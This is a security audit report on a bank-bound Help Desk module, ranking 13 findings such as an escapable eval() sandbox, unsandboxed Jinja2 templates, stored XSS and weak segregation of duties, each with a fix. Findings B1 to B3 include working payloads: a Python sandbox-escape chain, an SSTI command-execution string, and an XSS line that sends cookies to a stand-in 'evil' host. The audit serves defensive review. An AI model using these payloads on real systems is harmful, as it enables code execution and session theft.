# AVA Help Desk — Bank Readiness Security Audit

**Scope:** AVA native Help Desk only (`backend/grc/modules/helpdesk_native/*`), the finding→ticket bridge (`services/itsm_service.py`, `modules/vuln_management/routers/itsm.py`), HD models/schemas, HD RBAC (`permissions.py` helpdesk block, `helpdesk_native/common.py`, `auth_router.require_tenant_permission`), and the HD frontend where it bears on security.
**Method:** Read-only static review. No code changed. Native router confirmed LIVE (mounted in `main.py:231`; the "NOT MOUNTED YET" note in `router.py` is stale).
**Auditor stance:** Bank handover. Brutally honest. Not a rubber stamp.
**Date:** 2026-10-15

---

## EXECUTIVE VERDICT

**NOT bank-ready.** The Help Desk has a genuinely strong, well-reasoned functional core — clean tenant isolation (DB-per-tenant + consistent `tenant_id` filters), correct server-side requester-own-ticket isolation, Fernet-encrypted mail credentials, and a global HTTP audit middleware — but it ships **three remote-code-execution / stored-XSS class vulnerabilities reachable by a normal Help Desk agent or even an unauthenticated external emailer**: an escapable `eval()` sandbox on SLA conditions, an unsandboxed Jinja2 template render on saved replies, and unsanitized HTML (`dangerouslySetInnerHTML`) rendering of requester- and email-sourced ticket content in the agent console. On top of that the permission model has **no segregation of duties** (one coarse `tickets:edit` grant silently confers SLA config, mail-credential config, change approval, and role grant/revoke), deactivated/offboarded users can still act until their JWT expires, and the audit trail — while present — is fail-open and not tamper-evident. For a regulated bank these are disqualifying until remediated. The architecture is sound and worth hardening; the current build must not be handed over.

---

## SEVERITY COUNTS

| Severity | Count |
|----------|-------|
| BLOCKER  | 3 |
| HIGH     | 3 |
| MEDIUM   | 4 |
| LOW      | 3 |
| **Total**| **13** |

---

## RANKED FINDINGS

| # | Sev | Title | Evidence |
|---|-----|-------|----------|
| B1 | BLOCKER | SLA `condition` `eval()` sandbox is escapable → RCE (agent-reachable) | `sla.py:213,470,608` |
| B2 | BLOCKER | Unsandboxed Jinja2 render of saved-reply body → SSTI → RCE (agent-reachable) | `replies.py:467-475,507` |
| B3 | BLOCKER | Stored XSS: requester- and email-sourced ticket HTML rendered raw in agent console | `_ui.tsx:193`, `[id]/page.tsx:121,128`; `mail.py:388-394` |
| H1 | HIGH | No segregation of duties — coarse `tickets:edit` gates SLA/mail-creds/change-approval/role-grant | `common.py:26-27`; `permissions.py:351-362`; `people.py:637`; `change.py:92`; `mail.py:537`; `sla.py:1137-1146` |
| H2 | HIGH | Deactivated-user + idle-session bypass on permission-only endpoints | `auth_router.py:252-312` vs `196-249` |
| H3 | HIGH | Audit trail is fail-open and not tamper-evident; HD writes nothing domain-level | `audit_logger.py:547-561`; HD module has zero audit calls |
| M1 | MEDIUM | KB list leaks Draft/Archived article titles/authors to any requester | `kb.py:50-81`; `portal.py:128-133` |
| M2 | MEDIUM | PII (full ticket descriptions/replies) written verbatim into audit log | `audit_logger.py:534` |
| M3 | MEDIUM | Change approval has no approver separation (submit+approve by same agent) | `change.py:87-108` |
| M4 | MEDIUM | Unauthenticated GET `/helpdesk/config` performs a write-on-read (INSERT+commit) | `settings.py:94-103,204-210` |
| L1 | LOW | Guest email-feedback endpoints have no rate limit | `mail.py:630-650` |
| L2 | LOW | No application-layer rate limiting / DoS controls; unbounded bulk endpoints | `main.py` (no limiter); `tickets.py:958`, `itsm.py:104` |
| L3 | LOW | Schema via `create_all` + manual raw `ALTER`; no Alembic/migration history; manual deploy | `itsm_seed.py:433`; ops |

---

## DETAIL

### B1 — BLOCKER: SLA `condition` `eval()` is an escapable sandbox → RCE
**Files:** `helpdesk_native/sla.py:213`, `:470`, `:608` (validate).
**What:** Stored SLA `condition` strings are executed with `eval(s.condition, {"__builtins__": {}}, context)`. The context exposes only `{"doc": <ticket>}`.
**Why it's exploitable:** Emptying `__builtins__` does **not** sandbox `eval`. Language-level attribute access needs no builtins, e.g.
`doc.__class__.__mro__[1].__subclasses__()` (or `().__class__.__bases__[0].__subclasses__()`) walks to any class — `subprocess.Popen`, an `os`-importing warnings handler, etc. — yielding arbitrary command execution in the backend process. The code comment even concedes "AST-allowlist if conditions ever come from untrusted input."
**Who can set it:** `config_router POST/PUT /helpdesk/sla` is gated by `require_edit` = `helpdesk:tickets:edit` (`sla.py:1137-1146`, `common.py:27`). Any ordinary ticket agent — not just an admin — can author a condition. It is evaluated on ticket create, status change, and `/sla-preview`.
**Blast radius:** RCE on the backend host, which holds every tenant's DB credentials and the mail-credential Fernet key (derived from `SESSION_SECRET`). Full multi-tenant compromise from an agent account.
**Fix:** Replace `eval` with a real safe evaluator — an AST allowlist (names, literals, comparisons, boolean ops only) or a tiny purpose-built expression parser. Never `eval`/`exec` on stored strings. Restrict SLA authoring to a dedicated `helpdesk:settings:manage` grant (see H1).

### B2 — BLOCKER: Unsandboxed Jinja2 render of saved-reply body → SSTI → RCE
**File:** `helpdesk_native/replies.py:467-475` (`_render`), used by `get_rendered_saved_reply` (`:507`) behind `GET /helpdesk/saved-replies/{id}/rendered` (`:639`, `require_view`).
**What:** `jinja2.Template(template or "").render(**ctx)` renders the agent-authored saved-reply message. `jinja2.Template` uses the **default (non-sandboxed) environment**. The code comment explicitly says "so no sandbox."
**Why it's exploitable:** Classic SSTI — `{{ cycler.__init__.__globals__.os.popen('id').read() }}` (and equivalents via `self`, `lipsum`, `request`-free gadgets) execute arbitrary Python. Saved replies are created/edited via `require_edit` (`router.py:194-203`), rendered via `require_view`.
**Blast radius:** Same as B1 — RCE, full host/multi-tenant compromise, from an agent account.
**Fix:** Use `jinja2.sandbox.SandboxedEnvironment` with autoescape, and restrict the context to an explicit whitelist of scalar fields (the context currently injects every ORM column via `ticket.__table__.columns`). Better: use simple `str.format_map` / named placeholders rather than a template engine for canned replies.

### B3 — BLOCKER: Stored XSS from requester/email content rendered raw in the agent console
**Files:** frontend `grc-frontend/src/app/(dashboard)/helpdesk/_ui.tsx:193` (`dangerouslySetInnerHTML={{__html: m.content}}`), `[id]/page.tsx:121` (ticket `desc`) and `:128` (remediation `rec`). No `DOMPurify`/sanitizer is imported anywhere in the HD frontend.
**Source of the HTML (server stores it raw):**
- Requester portal reply / customer reply — `receive_customer_reply` (`tickets.py`, portal `portal.py:100-108`) stores body verbatim.
- **Inbound email body** — `mail.py:388-394` extracts and stores the HTML part of an ingested email (attachments are skipped, HTML body kept).
- Agent/requester ticket `description` — stored raw (`tickets.py:428`).
No server-side HTML sanitization exists (only `strip_html` on a single "Add Comment" *label* in `replies.py:487`).
**Exploit:** An end user (or, via the email channel, **any unauthenticated external party who emails the support address**) submits a body like `<img src=x onerror="fetch('//evil/?c='+document.cookie)">`. When an agent opens that ticket, it executes in the agent's authenticated session → session/token theft, actions performed as the agent, pivot into the whole Help Desk. The email vector needs no account at all.
**Fix:** Sanitize on render (DOMPurify) AND on store (server-side allowlist sanitizer, e.g. `bleach`/`nh3`) for descriptions, replies, and ingested email bodies. Treat all three as untrusted.

### H1 — HIGH: No segregation of duties; granular permissions are decorative
**Files:** `common.py:26-27` (only `helpdesk:tickets:view` and `:edit` are wired); `permissions.py:351-362` (matrix advertises `requests:{create,view_own}`, `tickets:{view,create,edit,delete,assign}`, `processes:{view,manage}`, `kb:{view,author}`, `settings:{view,manage}`).
**What:** The only gates the code actually enforces are `tickets:view`, `tickets:edit`, `tickets:delete` (`tickets.py:177`), `requests:view_own`, `requests:create`. Everything else collapses onto `tickets:edit`:
- SLA policy config incl. the `eval()` sink — `require_edit` (`sla.py:1137`).
- Email **account credential** create/update — `require_edit` (`mail.py:537,550`).
- KB authoring — `require_edit`, not `kb:author` (`kb.py:497`).
- Change **approval/reject/schedule** — `require_edit`, not a distinct approver perm (`change.py:92-108`).
- Department config, agent status, contacts, masters, tags — `require_edit`.
- **Agent role grant/revoke** — `require_edit` (`people.py:637,643`).
**Impact:** A tenant that grants an agent the `tickets:edit` needed to do their job unknowingly grants SLA config (→ B1 RCE), the ability to read/overwrite mailbox credentials, approve their own changes, author KB, and grant/revoke Help Desk roles. The `settings:manage`, `kb:author`, `processes:manage`, `tickets:assign` permissions shown in the Admin roles matrix are never checked — a false sense of least privilege. For a bank this fails least-privilege and SoD outright.
**Fix:** Bind each sensitive router group to its intended distinct permission (`settings:manage` for SLA/email/masters, `kb:author` for KB writes, a dedicated change-approval perm, an admin-only perm for role grant/revoke). Make role grant/revoke admin/primary-contact only.

### H2 — HIGH: Deactivated users and idle sessions bypass the permission-only gate
**Files:** `auth_router.py:252-312` (`require_tenant_permission.permission_checker`) vs `:196-249` (`require_auth`).
**What:** `require_auth` checks `user.is_active` (403 if deactivated) and enforces idle-session expiry. `permission_checker` (which backs `require_view`/`require_edit`/`require_requester`) decodes the JWT directly and does **neither** — no `is_active` recheck, no idle-timeout. Many HD mutating endpoints depend on `require_edit` **alone** (e.g. `tickets/{}/status`, `/update`, `/assign`, all of `masters`, `sla` config, `department`, `contacts`, `agent_status`, `incident/problem/change`, `saved-replies`).
**Impact:** An offboarded/suspended employee whose account was deactivated keeps full Help Desk write access (including SLA config → B1) until their existing JWT naturally expires. Idle-timeout session controls are also skipped on those endpoints. Banks require immediate session/entitlement revocation on offboarding.
**Fix:** Have `permission_checker` reuse the same identity path as `require_auth` (reject inactive users, enforce idle-timeout), or add `Depends(require_auth)` to every mutating HD route. Consider short JWT lifetimes + a revocation list.

### H3 — HIGH: Audit trail is fail-open and not tamper-evident; HD emits no domain events
**Files:** `main.py:123-179` (middleware), `audit_logger.py:441-561`; HD module (`grep` = zero `audit_logger`/`AuditLog` references).
**What's good:** A global HTTP middleware writes an `AuditLog` row (tenant, user from JWT, method-derived action, resource type/id, sanitized payload, IP) to the per-tenant `grc_audit_logs` for mutating HD requests. So there *is* a trail.
**Gaps for a bank:**
1. **Fail-open / silent.** `write_audit_log` wraps everything in `try/except: return` (`:560`) and runs *after* `call_next` — the endpoint has already committed. If the audit write fails (or `tenant_id`/slug can't resolve, `:478,489`), the action succeeds with **no record and no alarm**.
2. **Not tamper-evident.** Plain mutable table, ordinary `INSERT` (`:547-557`). No hash-chaining, no WORM, no append-only enforcement. The comment calls it a "tamper-evident mutation trail" but nothing cryptographically enforces that.
3. **No before→after capture.** Only the new value (request payload) is logged. "Who changed status/priority/assignee *from what to what*" isn't recoverable — a core bank audit requirement.
4. **Coarse semantics.** Security-critical events (role grant/revoke, SLA/eval config change, mailbox-credential change) are recorded only as generic `POST <path>` + payload rows, not first-class security events. The HD module itself writes nothing to the central log.
**Fix:** Make audit writes transactional with the action (same commit) and fail-closed for security-critical events; move to an append-only/hash-chained store (or DB WORM); capture old+new values via domain-level `write_rich_audit_log` calls for status/assign/role/config changes.

### M1 — MEDIUM: KB list leaks unpublished article titles/authors to requesters
**Files:** `kb.py:50-81` (`list_articles` — no status filter), exposed to end users via `portal.py:128-133` (`/helpdesk/portal/kb`, `require_requester`).
**What:** `get_article` correctly blocks non-agents from unpublished bodies (`kb.py:166-167`, 403). But `list_articles` returns **every** article regardless of status, including `title`, `author`, `category`, `status`, and `views` for Draft and Archived items. Any requester-role user gets the metadata of in-progress/withdrawn articles.
**Impact:** Information disclosure — internal/unpublished KB titles and authorship leak to all end users. Low confidentiality impact but a clear least-information failure.
**Fix:** Filter `list_articles` to `status == "Published"` for non-agent callers (pass the caller's agent status, as `get_article` already does).

### M2 — MEDIUM: Full ticket PII copied verbatim into the audit log
**File:** `audit_logger.py:527-540` (`details["request"] = request_payload`).
**What:** The audit middleware stores the whole request payload — including ticket descriptions and reply bodies (customer PII, possibly account/financial detail in a bank context) — into `grc_audit_logs.changes`. `_sanitize_value` targets secrets, not free-text PII.
**Impact:** The audit log becomes a second, long-retained copy of all ticket PII, accessible to anyone who can read audit logs, and subject to the same tamper-mutability as H3. Conflicts with data-minimization/retention expectations.
**Fix:** Redact or hash large free-text bodies in the audit payload; store a reference (ticket id + field changed) rather than the full content; define retention.

### M3 — MEDIUM: Change approval has no approver separation
**File:** `change.py:87-134` — `submit`, `approve`, `reject`, `schedule`, `complete`, `cancel` all require only `require_edit`.
**What:** The same agent who submits a change can approve it; there is no distinct approver role, no "approver ≠ requester" check. `approve_change` records the acting user but doesn't prevent self-approval.
**Impact:** Defeats the control objective of change management (and ITIL CAB). A bank's change process requires enforced separation.
**Fix:** Introduce a change-approver permission, forbid self-approval, and record the approver identity against the change.

### M4 — MEDIUM: Unauthenticated `/helpdesk/config` writes to the DB on read
**File:** `settings.py:204-210` → `_get_or_create` (`:94-103`) does `db.add(...); db.commit()`.
**What:** `GET /helpdesk/config` is intentionally guest-accessible (no RBAC). On first call for a tenant it INSERTs and commits an `HDSettings` row. An unauthenticated caller triggers a write.
**Impact:** Unauthenticated row creation / write amplification; minor DoS and data-integrity surface. The returned body itself is safe (branding + boolean flags only — no secrets; verified).
**Fix:** Make the guest read path read-only (return defaults without persisting); create the settings row lazily on an authenticated write.

### L1 — LOW: Guest email-feedback endpoints are unauthenticated and unthrottled
**File:** `mail.py:630-650` (`GET`/`POST /helpdesk/email/feedback`). The `uuid4` feedback key is the only authenticator (122-bit — strong), and a second submission is rejected. No rate limit. Acceptable, but add throttling to the guest surface.

### L2 — LOW: No application-layer rate limiting / DoS controls
**File:** `main.py` (no `slowapi`/limiter/`TrustedHost`). Bulk endpoints (`tickets.py:958 /bulk-reply`, `itsm.py:104 /bulk-push-to-itsm`) iterate caller-supplied ID lists with no cap. Verify a WAF/reverse-proxy enforces rate limits and request caps with ops; add per-route limits and bulk-size bounds.

### L3 — LOW: No migration framework; manual schema ALTER and manual deploy
**File:** `itsm_seed.py:433` — `db.execute(text(f"ALTER TABLE {table} ADD COLUMN IF NOT EXISTS {name} {ddl}"))`. The interpolated values are developer constants (no injection), but the schema is maintained by `create_all` + this hand-rolled ALTER seeder, with **no Alembic** — no migration history, no reviewed rollback, no drift detection. Deployment (per memory) is manual `git reset` + seeder + `systemctl` with no CI/CD gate. For a bank's change-control and DR this is a gap. **Verify with ops:** backups/DR, migration governance, and CI/CD gating — not verifiable from code.

---

## KNOWN FUNCTIONAL GAPS (confirmed — a bank would treat these as incomplete)
- **Email notifications are a no-op until a mailbox is configured.** Send/poll are deliberate safe no-ops with no account (`mail.py:578-579,623-626`). Acknowledgement/feedback/notification emails silently do not fire. Whether a mailbox is configured in prod is **not verifiable from code — verify with ops.**
- **Reply/email attachments are not persisted.** Inbound email attachments are explicitly skipped (`mail.py:393-394`); there is no file store and `ReplyBody` has no attachment field. Attachment-bearing tickets lose their attachments.
- These are the two gaps flagged in the task; both confirmed.

---

## WHAT IS SOLID (verified, so the hardening track builds on a real base)
- **Tenant isolation:** DB-per-tenant; every HD query filters `tenant_id`; cross-tenant id → `None`/404. The finding→ticket bridge scopes by `vuln.tenant_id` / `get_user_tenants(...).in_(tenants)` consistently (`itsm_service.py`, `itsm.py:28-38,83-90`). No cross-tenant read/write path found.
- **Requester own-ticket isolation:** enforced server-side on `raised_by == signed-in email` at the SQL layer (`tickets.py:293-294`) and via `_own_ticket` 404 gate (`portal.py:52-59`); the portal create/reply never trust a client-supplied owner (`portal.py:63-78`).
- **Mail credentials:** Fernet (AES-128-CBC+HMAC) via `crypto.py`, key PBKDF2(200k) from `SESSION_SECRET`; passwords never returned (`mail.py:160-181` redacts to `has_*` booleans). Correctly implemented (caveats: static salt, env-key not KMS, legacy-plaintext passthrough during rollout — documented in `crypto.py`).
- **Error handling (F):** No `debug=True`, no custom catch-all leaking tracebacks; FastAPI returns generic 500s. HTTPExceptions carry safe messages. No stack-trace leakage found.
- **No SQL injection:** all data access is SQLAlchemy ORM / parameterized; the only raw SQL is the constant-driven DDL in L3.
- **Every HD endpoint is authenticated and permission-gated.** Enumerated all routes in `router.py` + every included sub-router (tickets/extra, sla config, masters, people write, agent_status, contacts, replies actions, kb write, dashboard, analytics, tags, views, settings, department, mail, incident, problem, change, service_request, itsm_seed, request_templates, portal). The only intentionally ungated endpoints are the guest `GET /helpdesk/config` (M4) and the uuid-key email-feedback pair (L1) — both reviewed. Admin + primary-contact bypass is intentional and consistent with the rest of the app.

---

## RECOMMENDATION
Do not hand over. Open a P0 remediation track: fix B1/B2/B3 (eliminate `eval`, sandbox/replace Jinja, sanitize HTML in+out), then H1/H2/H3 (real SoD, inactive/idle enforcement on the permission gate, fail-closed tamper-evident audit with before/after capture). Re-audit after the P0/P1 fixes, with a live pen test of the SLA-condition, saved-reply, and email-ingestion paths specifically.
